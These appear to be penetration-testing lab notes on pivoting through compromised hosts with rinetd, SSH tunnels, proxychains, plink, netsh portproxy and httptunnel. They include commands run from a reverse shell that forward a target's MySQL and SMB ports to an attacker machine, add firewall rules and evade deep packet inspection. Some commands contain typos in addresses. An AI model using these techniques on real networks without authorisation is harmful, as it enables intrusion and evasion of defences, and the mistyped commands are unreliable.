# Port Redirection and Tunneling

## Port Forwarding

Test Internet connectivity:
```
ping google.com -c 1
nc -nvv 216.58.207.142 80
GET / HTTP/1.0
```

We can use rinetd to redirect traffic from a host with no Internet connectivity, via one that does.

```
sudo apt install rinetd
cat /etc/rinetd.conf
# Edit file to include the required details. connectaddress is the destination.
0.0.0.0   80    216.58.207.142    80
# All traffic received on all interfaces for port 80 will be redirected to 216.58.207.142.80.
sudo service rinetd restart
# Verify
ss -antp | grep "80"
# From target
nc -nvv <Kali Host>
GET / HTTP/1.0
```

## SSH Tunneling

Local port forwarding using SSH:

```bash
Bind our local address to the port we wish to forward over SSH tunnel with `0:0:0:0:445` and the server to forward too `191.168.1.110:445` and do this through the Linux target `student@192.168.208..44`
ssh -N -L [bind_address:]port:host:hostport [username@address]

# Edit /etc/samba/smb.conf
client min protocol SMB2
sudo ssh -N -L 0.0.0.0:445:172.16.208.5:445 student@192.168.208.44

# Only listening on a local address?
sudo ssh -N -L 80:localhost:80 student@192.168.208.52 -p 2222
```

Remote port forwarding using SSH:  
ssh to kali machine `kali@192.168.119.208` with `-N` for no commands, and `-R` for remote forward. Open a listener on kali machine `2221` and forward connections to the internal Linux TCP port `3306` with `128.0.0.1:3306`.

```bash
ssh -N -R [bind_address:]port:host:hostport [username@address]

ssh -N -R 192.168.119.208:2221:127.0.0.1:3306 kali@192.179.119.208

# Reverse bind from local to remote:
sh -N -R 192.168.208.52:5555:127.0.0.1:2221 student@192.168.208.52 -p 2222
```

Dynamic Port Forwarding using SSH:

```bash
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
# Use -D for dynamic SOCKS4 application-level port forwarding.

# Tunnel all incoming traffic through the SSH tunnel:
sudo ssh -N -D 127.0.0.1:8080 student@192.168.208.44

# Direct tooling through the tunnel:
vim /etc/proxychains.conf
# Add:
socks4  127.0.0.1 8080

# Run tools through proxychains by prepending each command with proxychains:
sudo proxychains nmap --top-ports=20 -sT -Pn 172.16.208.5
```

By default, ProxyChains will attempt to read its configuration file first from the current directory, then from the user's $(HOME)/.proxychains directory, and finally from /etc/proxychains.conf. This allows us to run tools through multiple dynamic tunnels, depending on our needs.

## Windows

plink.exe is a Windows command line SSH client.

We can use remote port forwarding `-R` and specify the user `-l` and password `-pw` to connect via `-ssh`. We can bind the remote Kali `192.168.119.234:1234` to the MySQL port of the Windows target `127.0.0.1:3306`. 

If we aren't operating interactively (ie. over a reverse shell), we can pipe answers to the prompt with cmd.exe /c echo y:
`cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`

We can then access the MySQL port from our local Kali instance over the bound port:
`sudo nmap -sS -sV 127.0.0.1 -p 1234`

We can also use netsh if we have system privileges and want to pivot to another network. We can forward traffic from the compromised Windows machine onto the target machine.

Use the netsh `interface` context to add an IPv4-to-IPv4 `v4tov4` proxy `portproxy` listening on 192.168.148.10 `listenaddress=192.168.148.10`, port 4455 `listenport=4455` that will forward to the Windows 2016 Server `connectaddress=172.16.148.5` on port 445 `connectport=445`:  

`netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.148.10 connectport=445 connectaddress=172.16.148.5`  

We may need to add a firewall rule:  
`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.148.10 localport=4455 action=allow`  

On Kali we may need to amend the SMB min protocol as before:
```bash
sudo vim /etc/samba/smb.conf

min protocol = SMB2

sudo systemctl restart smbd

smbclient -L 192.168.148.10 --port=4455 --user=Administrator
```

Errors may be seen due to the port forwarding, despite issues with listing we can still mount shares:

```bash
sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //192.168.148.10/Data -o username=Administrator,password=XXX /mnt/win10_share
ls -l /mnt/win10_share/
cat /mnt/win10_share/data.txt
```

## HTTP Tunneling

These techniques are used to avoid deep packet inspection which may prevent the previous SSH based techniques from working.

```bash
# Kali
sudo apt install httptunnel

# From our obtained reverse shell. Creat a local SSH tunnel to bind the local port 8888 to the RDP port on the Windows server to pivot too.
ssh -L 0.0.0.0:8888:172.16.148.5:3389 student@127.0.0.1
ss -antp | grep "8888"

# Set up HTTP Tunnel server to listen on port 1234 and decapsulate traffic and redirect it to port 8888 (which then uses the local SSH port forwarding to send to server).
hts --forward-port localhost:8888 1234
ps aux | grep hts
ss -antp | grep "1234"

# Create client on Kali machine to send traffic received on 8080 to the Linux pivot host, this is where we dodge the firewall.
htc --forward-port 8080 192.168.148.44:1234
ps aux | grep htc
ss -antp | grep "8080"

# Now we can RDP to desktop by calling our Kali host on port 8080.
rdesktop 127.0.0.1:8080
```
